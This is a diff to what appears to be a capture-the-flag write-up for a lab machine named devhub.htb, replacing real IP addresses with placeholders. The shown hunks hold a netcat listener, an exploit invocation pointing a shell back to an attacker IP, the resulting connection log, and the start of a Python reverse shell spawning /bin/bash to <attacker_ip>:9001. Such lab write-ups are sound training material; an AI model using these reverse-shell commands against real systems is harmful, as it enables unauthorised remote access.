@@ -18,7 +18,7 @@ The scan reveals SSH (22) and an nginx web server on 80.
 Add `devhub.htb` to `/etc/hosts`:
 
 ```bash
-echo "10.129.245.216 devhub.htb" | sudo tee -a /etc/hosts
+echo "<target_ip> devhub.htb" | sudo tee -a /etc/hosts
 ```
 
 ---
@@ -116,11 +116,11 @@ nc -lvnp 8888
 Run the exploit:
 
 ```bash
-python3 exploit.py http://devhub.htb:6274 --ip 10.10.15.155 --port 8888
+python3 exploit.py http://devhub.htb:6274 --ip <attacker_ip> --port 8888
 ```
 
 ```text
-connect to [10.10.15.155] from (UNKNOWN) [10.129.245.216] 44322
+connect to [<attacker_ip>] from (UNKNOWN) [<target_ip>] 44322
 ```
 
 The initial shell is obtained as `mcp-dev`.
@@ -242,7 +242,7 @@ import subprocess
 import os
 
 s = socket.socket()
-s.connect(("10.10.15.155", 9001))
+s.connect(("<attacker_ip>", 9001))
 
 p = subprocess.Popen(
     ["/bin/bash", "-i"],
